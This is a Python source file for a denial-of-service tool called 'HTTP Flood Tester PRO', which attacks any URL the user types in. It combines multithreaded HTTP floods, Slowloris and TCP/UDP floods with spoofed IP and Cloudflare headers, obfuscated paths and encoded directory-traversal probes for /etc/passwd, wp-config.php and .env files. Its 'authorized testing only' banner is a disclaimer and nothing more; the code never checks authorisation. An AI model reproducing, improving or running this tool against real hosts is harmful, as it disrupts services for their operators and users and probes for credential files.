import urllib.request
import concurrent.futures
import random
import re
import os
import time
import socket
import ssl
from colorama import Fore, Style
import threading
import faker
from fake_useragent import UserAgent
import string
from urllib.parse import urlparse
import base64
import json
import gzip
import struct
import select
import sys

class AdvancedHTTPFlooder:
    """
    HTTP Flood Testing Tool PRO v11 - For Authorized Security Testing Only
    Combines multiple attack vectors with advanced evasion techniques
    """

    def __init__(self):
        # Enhanced configuration
        self.config = {
            'VERSION': "11.0 PRO-ULTIMATE",
            'AUTHOR': "CyberSecurity Research Team",
            'MAX_THREADS': 500,  # Increased thread capacity
            'REQUEST_TIMEOUT': 5,
            'MAX_REQUESTS': 5000,
            'SAFE_MODE': False,  # More aggressive by default
            'DYNAMIC_THROTTLING': True,
            'ATTACK_DURATION': 300,  # Default 5 minutes
            'ATTACK_MODE': "AUTO",  # AUTO, HTTP-FLOOD, SLOWLORIS, LAYER4
            'WAF_EVASION': True,
            'OBFUSCATION': True
        }

        # Libraries initialization
        self.fake = faker.Faker()
        self.ua = UserAgent()
        self.context = ssl.create_default_context()
        self.context.check_hostname = False
        self.context.verify_mode = ssl.CERT_NONE

        # Attack state
        self.counter = 0
        self.running = False
        self.start_time = 0
        self.lock = threading.Lock()
        self.adaptive_delay = 0.05
        self.active_connections = []
        self.current_mode = "HTTP-FLOOD"

        # WAF bypass patterns
        self.waf_bypass_paths = [
            "/.%2e/%2e%2e/%2e%2e/etc/passwd",
            "/wp-admin/%2e%2e/wp-config.php",
            "/.env",
            "/api/%2e%2e/v1/users",
            "/static/%2e%2e/%2e%2e/config.json"
        ]

    # ================= Enhanced Utility Methods =================

    def generate_random_string(self, length=12):
        """Generate random alphanumeric string with special chars"""
        chars = string.ascii_letters + string.digits + "_-~."
        return ''.join(random.choice(chars) for _ in range(length))

    def generate_complex_path(self):
        """Generate random URL path with WAF evasion techniques"""
        if random.random() < 0.3 and self.config['WAF_EVASION']:
            path = random.choice(self.waf_bypass_paths)
            if random.random() < 0.5:
                path = base64.b64encode(path.encode()).decode()
            return path
        
        depths = random.randint(1, 6)
        parts = []
        for _ in range(depths):
            part = self.generate_random_string(random.randint(3, 10))
            if random.random() < 0.2:
                part = f"%2e%2e/{part}"  # Directory traversal attempt
            parts.append(part)
        
        path = '/' + '/'.join(parts)
        
        if self.config['OBFUSCATION'] and random.random() < 0.4:
            path = base64.b64encode(path.encode()).decode()
        
        return path

    def generate_evasive_headers(self, host):
        """Generate highly randomized HTTP headers with advanced evasion"""
        headers = {
            "User-Agent": self.ua.random,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": f"{random.choice(['en','ar','fr','es','zh','ru'])}-{random.choice(['US','GB','SA','FR','CN','RU'])};q=0.{random.randint(5,9)}",
            "Accept-Encoding": random.choice(["gzip, deflate, br", "identity", "*", "compress, gzip"]),
            "Connection": random.choice(["keep-alive", "close", "Upgrade"]),
            "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store", "private"]),
            "Referer": random.choice([
                f"https://www.google.com/search?q={self.generate_random_string()}",
                f"https://{host}/",
                f"https://example.com/{self.generate_random_string()}",
                f"https://facebook.com/{self.generate_random_string()}"
            ]),
            "X-Forwarded-For": self.fake.ipv4(),
            "X-Request-ID": self.generate_random_string(16),
            "X-Real-IP": self.fake.ipv4(),
            "Forwarded": f"for={self.fake.ipv4()};proto=https;host={host}"
        }

        # Add advanced WAF bypass headers
        if self.config['WAF_EVASION']:
            headers.update({
                "X-Originating-IP": self.fake.ipv4(),
                "X-Remote-IP": self.fake.ipv4(),
                "X-Remote-Addr": self.fake.ipv4(),
                "X-Client-IP": self.fake.ipv4(),
                "CF-Connecting-IP": self.fake.ipv4(),
                "True-Client-IP": self.fake.ipv4(),
                "X-WAF-EVASION": "1"
            })

            # Cloudflare bypass headers
            if random.random() < 0.3:
                headers.update({
                    "CF-IPCountry": random.choice(["US", "GB", "DE", "FR", "CN"]),
                    "CF-Ray": f"{random.randint(100000, 999999)}-{random.choice(['SIN','LHR','DFW','MIA'])}",
                    "CF-Visitor": '{"scheme":"https"}'
                })

        return headers

    # ================= Advanced Attack Methods =================

    def execute_http_flood(self, target):
        """Execute a single HTTP request with advanced evasion"""
        if not self.running:
            return

        try:
            parsed = urlparse(target)
            host = parsed.netloc
            path = self.generate_complex_path() if random.random() > 0.2 else parsed.path

            # Protocol randomization
            protocol = "https" if random.random() > 0.4 else "http"
            url = f"{protocol}://{host}{path}"

            # Parameter randomization with obfuscation
            if random.random() > 0.1:
                param_name = self.generate_random_string(random.randint(3, 8))
                param_value = self.generate_random_string(random.randint(5, 15))
                if self.config['OBFUSCATION'] and random.random() < 0.3:
                    param_name = base64.b64encode(param_name.encode()).decode()
                    param_value = base64.b64encode(param_value.encode()).decode()
                
                url += f"?{param_name}={param_value}"
                if random.random() > 0.3:
                    url += f"&{self.generate_random_string(4)}={random.randint(1, 10000)}"
                if random.random() > 0.5:
                    url += f"&__cachebuster={int(time.time())}"

            # Method randomization
            method = random.choice(["GET", "POST", "HEAD", "PUT", "OPTIONS", "DELETE"])

            # Advanced request building
            req = urllib.request.Request(
                url,
                headers=self.generate_evasive_headers(host),
                method=method
            )

            # Random POST data
            if method in ["POST", "PUT"] and random.random() < 0.7:
                post_data = {
                    self.generate_random_string(5): self.generate_random_string(8),
                    "timestamp": int(time.time()),
                    "token": self.generate_random_string(12)
                }
                if random.random() < 0.3:
                    post_data = json.dumps(post_data).encode()
                    req.add_header("Content-Type", "application/json")
                else:
                    post_data = urllib.parse.urlencode(post_data).encode()
                req.data = post_data

            try:
                with urllib.request.urlopen(req, timeout=self.config['REQUEST_TIMEOUT'], context=self.context) as res:
                    status = res.status
            except urllib.error.HTTPError as e:
                status = e.code
            except:
                status = 0

            # Adaptive throttling
            if self.config['DYNAMIC_THROTTLING']:
                if status == 429:  # Rate limited
                    self.adaptive_delay = min(1.5, self.adaptive_delay * 1.3)
                elif status == 200:
                    self.adaptive_delay = max(0.01, self.adaptive_delay * 0.95)

            with self.lock:
                self.counter += 1
                self.display_status(status)

        except Exception as e:
            pass

    def slowloris_attack(self, target):
        """Slowloris attack implementation"""
        parsed = urlparse(target)
        host = parsed.netloc
        port = parsed.port if parsed.port else (443 if parsed.scheme == 'https' else 80)
        
        try:
            # Create partial HTTP request
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.config['REQUEST_TIMEOUT'])
            
            if parsed.scheme == 'https':
                s = self.context.wrap_socket(s, server_hostname=host)
            
            s.connect((host, port))
            
            # Send partial headers
            headers = self.generate_evasive_headers(host)
            partial_request = f"GET /{self.generate_random_string()} HTTP/1.1\r\n"
            partial_request += f"Host: {host}\r\n"
            
            # Send headers one by one slowly
            for header, value in headers.items():
                partial_request += f"{header}: {value}\r\n"
                s.send(partial_request.encode())
                partial_request = ""
                time.sleep(random.uniform(0.1, 0.5))
            
            # Keep connection open
            while self.running:
                s.send(f"X-a: {self.generate_random_string(6)}\r\n".encode())
                time.sleep(random.uniform(1, 10))
                
            s.close()
            
        except Exception as e:
            pass
        finally:
            with self.lock:
                self.counter += 1
                self.display_status(200)

    def layer4_attack(self, target):
        """Layer 4 network flood"""
        parsed = urlparse(target)
        host = parsed.netloc
        port = parsed.port if parsed.port else (443 if parsed.scheme == 'https' else 80)
        
        try:
            # Create raw socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            
            # SYN flood
            if random.random() < 0.7:
                s.connect((host, port))
                while self.running:
                    try:
                        s.send(self.generate_random_string(1024).encode())
                        time.sleep(0.01)
                    except:
                        s.close()
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(1)
                        s.connect((host, port))
            else:
                # UDP flood variation
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while self.running:
                    s.sendto(self.generate_random_string(512).encode(), (host, port))
                    time.sleep(0.01)
            
            s.close()
            
        except Exception as e:
            pass
        finally:
            with self.lock:
                self.counter += 1
                self.display_status(0)

    # ================= Attack Control Methods =================

    def attack_worker(self, target):
        """Worker thread that selects attack method based on mode"""
        while self.running and time.time() < self.start_time + self.config['ATTACK_DURATION']:
            if self.current_mode == "HTTP-FLOOD":
                self.execute_http_flood(target)
            elif self.current_mode == "SLOWLORIS":
                self.slowloris_attack(target)
            elif self.current_mode == "LAYER4":
                self.layer4_attack(target)
            else:  # AUTO mode
                mode = random.choice(["HTTP-FLOOD", "SLOWLORIS", "LAYER4"])
                if mode == "HTTP-FLOOD":
                    self.execute_http_flood(target)
                elif mode == "SLOWLORIS":
                    self.slowloris_attack(target)
                else:
                    self.layer4_attack(target)
            
            if self.config['DYNAMIC_THROTTLING']:
                time.sleep(self.adaptive_delay)

    def rotate_attack_mode(self):
        """Rotate attack mode periodically for more effectiveness"""
        modes = ["HTTP-FLOOD", "SLOWLORIS", "LAYER4"]
        while self.running:
            time.sleep(random.randint(30, 120))
            self.current_mode = random.choice(modes)
            print(f"\n{Fore.MAGENTA}[*] Rotating attack mode to: {self.current_mode}{Fore.RESET}")

    # ================= Monitoring and Control =================

    def display_status(self, last_status):
        """Display real-time attack statistics"""
        elapsed = time.time() - self.start_time
        remaining = max(0, self.config['ATTACK_DURATION'] - elapsed)
        rps = self.counter / elapsed if elapsed > 0 else 0

        status_msg = (
            f"{Fore.CYAN}[STATUS]{Fore.RESET} "
            f"Mode: {Fore.YELLOW}{self.current_mode}{Fore.RESET} | "
            f"Threads: {Fore.YELLOW}{self.config['MAX_THREADS']}{Fore.RESET} | "
            f"Requests: {Fore.GREEN}{self.counter}{Fore.RESET} | "
            f"RPS: {Fore.MAGENTA}{rps:.1f}{Fore.RESET} | "
            f"Last: {Fore.CYAN}{last_status}{Fore.RESET} | "
            f"Delay: {Fore.YELLOW}{self.adaptive_delay:.2f}s{Fore.RESET} | "
            f"Remaining: {Fore.RED}{remaining:.1f}s{Fore.RESET}"
        )
        print(status_msg, end='\r')

    def get_user_settings(self):
        """Get custom settings from user"""
        try:
            # Threads setting
            threads = input(f"{Fore.BLUE}[?] Enter number of threads (default {self.config['MAX_THREADS']}): {Fore.RESET}").strip()
            if threads:
                threads = int(threads)
                if 1 <= threads <= 2000:
                    self.config['MAX_THREADS'] = threads
            
            # Duration setting
            duration = input(f"{Fore.BLUE}[?] Enter attack duration in seconds (default {self.config['ATTACK_DURATION']}): {Fore.RESET}").strip()
            if duration:
                self.config['ATTACK_DURATION'] = int(duration)
            
            # Attack mode
            print(f"\n{Fore.BLUE}Available attack modes:{Fore.RESET}")
            print(f"1. HTTP Flood (Fast requests)")
            print(f"2. Slowloris (Slow connections)")
            print(f"3. Layer4 (Network flood)")
            print(f"4. Auto (Rotate between all)")
            mode = input(f"{Fore.BLUE}[?] Select attack mode (1-4, default 4): {Fore.RESET}").strip()
            if mode == "1":
                self.config['ATTACK_MODE'] = "HTTP-FLOOD"
            elif mode == "2":
                self.config['ATTACK_MODE'] = "SLOWLORIS"
            elif mode == "3":
                self.config['ATTACK_MODE'] = "LAYER4"
            else:
                self.config['ATTACK_MODE'] = "AUTO"
            
            # Advanced options
            advanced = input(f"{Fore.BLUE}[?] Enable advanced options? (WAF evasion, obfuscation) [Y/n]: {Fore.RESET}").strip().lower()
            if advanced == 'n':
                self.config['WAF_EVASION'] = False
                self.config['OBFUSCATION'] = False
            
        except ValueError:
            print(f"{Fore.YELLOW}[!] Invalid input, using defaults{Fore.RESET}")

    def start_attack(self, target):
        """Start the advanced attack"""
        self.display_banner()
        self.get_user_settings()
        
        if not self.validate_target(target):
            print(f"{Fore.RED}[!] Invalid target URL{Fore.RESET}")
            return

        print(f"\n{Fore.YELLOW}[*] Initializing {self.config['ATTACK_MODE']} attack against: {target}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Configuration: {self.config['MAX_THREADS']} threads, {self.config['ATTACK_DURATION']} seconds duration{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Advanced features: WAF Evasion={self.config['WAF_EVASION']}, Obfuscation={self.config['OBFUSCATION']}{Fore.RESET}")

        self.running = True
        self.start_time = time.time()
        self.current_mode = self.config['ATTACK_MODE']

        # Start mode rotation thread if in AUTO mode
        if self.config['ATTACK_MODE'] == "AUTO":
            threading.Thread(target=self.rotate_attack_mode, daemon=True).start()

        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.config['MAX_THREADS']) as executor:
                # Start the threads
                futures = [executor.submit(self.attack_worker, target) 
                          for _ in range(self.config['MAX_THREADS'])]

                # Monitor and control
                while (self.running and 
                       time.time() < self.start_time + self.config['ATTACK_DURATION']):
                    time.sleep(0.5)
                    if self.config['DYNAMIC_THROTTLING']:
                        time.sleep(self.adaptive_delay)

                # Cleanup
                self.running = False
                concurrent.futures.wait(futures)

        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Fore.RED}[!] Attack stopped by user{Fore.RESET}")

        finally:
            self.display_summary()

    # ================= UI and Helpers =================

    def validate_target(self, url):
        """Validate the target URL"""
        try:
            result = urlparse(url)
            return all([result.scheme in ['http','https'], result.netloc])
        except:
            return False

    def display_banner(self):
        """Display the program banner"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{Fore.RED}
        ██╗  ██╗████████╗████████╗██████╗ ██╗     ██████╗  ██████╗ 
        ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗██║     ██╔══██╗██╔═══██╗
        ███████║   ██║      ██║   ██████╔╝██║     ██████╔╝██║   ██║
        ██╔══██║   ██║      ██║   ██╔═══╝ ██║     ██╔═══╝ ██║   ██║
        ██║  ██║   ██║      ██║   ██║     ███████╗██║     ╚██████╔╝
        ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚══════╝╚═╝      ╚═════╝ 
        {Fore.RESET}{"HTTP Flood Tester PRO v11".center(60)}
        {Fore.CYAN}Version: {self.config['VERSION']} (For Authorized Testing Only){Fore.RESET}
        {Fore.YELLOW}WARNING: Unauthorized use is illegal!{Fore.RESET}
        """)

    def display_summary(self):
        """Display attack summary"""
        elapsed = time.time() - self.start_time
        rps = self.counter / elapsed if elapsed > 0 else 0

        print(f"\n\n{Fore.GREEN}[+] Attack completed{Fore.RESET}")
        print(f"{Fore.YELLOW}╔{'═'*60}╗")
        print(f"║ {'Advanced Attack Summary'.center(58)} ║")
        print(f"╠{'═'*60}╣")
        print(f"║ {f'Target: {self.target}'.ljust(58)} ║")
        print(f"║ {f'Attack Mode: {self.config["ATTACK_MODE"]}'.ljust(58)} ║")
        print(f"║ {f'Total Requests/Connections: {self.counter}'.ljust(58)} ║")
        print(f"║ {f'Duration: {elapsed:.2f} seconds'.ljust(58)} ║")
        print(f"║ {f'Requests/Connections Per Second: {rps:.2f}'.ljust(58)} ║")
        print(f"║ {f'Max Threads Used: {self.config["MAX_THREADS"]}'.ljust(58)} ║")
        print(f"║ {f'WAF Evasion: {"Enabled" if self.config["WAF_EVASION"] else "Disabled"}'.ljust(58)} ║")
        print(f"║ {f'Obfuscation: {"Enabled" if self.config["OBFUSCATION"] else "Disabled"}'.ljust(58)} ║")
        print(f"╚{'═'*60}╝\n")

# ================= Main Execution =================

if __name__ == "__main__":
    tester = AdvancedHTTPFlooder()

    # Get target URL safely
    while True:
        target = input(f"{Fore.BLUE}[?] Enter target URL (http(s)://example.com) or 'exit': {Fore.RESET}").strip()
        if target.lower() == 'exit':
            break
        if tester.validate_target(target):
            tester.target = target
            tester.start_attack(target)
            break
        print(f"{Fore.RED}[!] Invalid URL format. Include http:// or https://{Fore.RESET}")